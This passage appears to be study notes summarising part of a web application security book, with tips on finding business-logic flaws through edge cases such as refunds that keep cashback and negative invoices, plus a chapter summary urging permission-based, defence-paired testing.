  • Write down every intended use case, and your best guess at the backend steps behind each one.
  • For each, list the edge cases nobody handled: currency of the reward, merchant-account fees vs rewards, negative invoices, purchase-then-refund keeping the cashback.
  • Test those edge cases. They are the attack vectors.

Chapter 19 · Part II Summary

Ten attack families, one skill underneath: knowing both the archetype and the business so you can see the unusual case.

  • Archetypes are necessary but not sufficient — XSS, CSRF, XXE and injection hit everyone; truly deep flaws are unique to a business model.
  • Look at the business model — only a deep understanding of business logic finds the advanced flaws.
  • If attacks feel inapplicable, improve recon — the book’s honest diagnosis: either the target is hardened, or you have not yet found the surface where your payload lands.
  • Pair every attack with its defence — Part III is the mirror image, and the book reminds you that defences are “mitigations”, not fixes: they are bypassable, so you layer them.
  • These techniques are dangerous — use them with permission, and prefer red-team framing.
